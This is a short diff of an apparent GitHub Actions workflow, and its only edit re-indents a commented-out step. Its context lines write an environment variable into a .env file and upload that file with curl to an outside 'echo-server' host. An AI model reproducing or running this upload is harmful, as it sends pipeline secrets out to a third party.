@@ -91,7 +91,7 @@ jobs:
           echo $ENV_VAR_NAME_TWO > .env
           curl -i -X PUT -F "data=@.env" https://flask-news.marefx.com/echo-server      
 
-      #      - name: Set image
+#      - name: Set image
 #        id: image_name
 #        run: |
 #          pretty_app="UNKNOWN"
